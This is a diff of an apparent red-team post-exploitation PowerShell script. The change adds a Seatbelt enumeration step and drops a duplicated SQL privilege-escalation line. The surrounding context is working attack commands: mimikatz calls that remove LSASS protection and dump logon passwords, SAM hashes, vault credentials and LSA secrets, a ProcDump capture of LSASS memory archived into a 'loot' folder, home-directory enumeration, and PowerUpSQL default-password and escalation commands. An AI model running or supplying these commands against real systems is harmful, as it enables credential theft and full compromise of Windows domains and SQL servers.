@@ -7,6 +7,7 @@ catch {$_}
 ./mimikatz*/mimikatz.exe "token::elevate" "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "lsadump::sam" "sekurlsa::Credman" "sekurlsa::Wdigest" "vault::cred /patch" "lsadump::secrets" "exit" | tee mimikatz.txt
 ./procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
 Compress-Archive -LiteralPath C:/blood/lsass.dmp -DestinationPath C:/blood/loot/lsass.zip
+invoke-seatbelt "-group=all" | tee loot/seatbelt.txt
 
 echo "ENUMERATING USERS HOME:"
 tree /F /A "C:/Users" | tee loot/home_tree
@@ -50,7 +51,6 @@ Get-SQLInstanceDomain -Verbose | Get-SQLServerLoginDefaultPw -Verbose
 Get-SQLServerInfo -Instance "SQL_NAME"
 Invoke-SQLEscalatePriv -Verbose -Instance "SQL_NAME"
 Invoke-SQLAudit -Verbose -Instance SQL_NAME
-Invoke-SQLEscalatePriv -Verbose -Instance "SQL_NAME"
 Invoke-SQLDumpInfo -Verbose -Instance "SQL_NAME"
 Get-SqlServerLinkCrawl -Instance "SQL_NAME" | select instance,links | ft
 "@
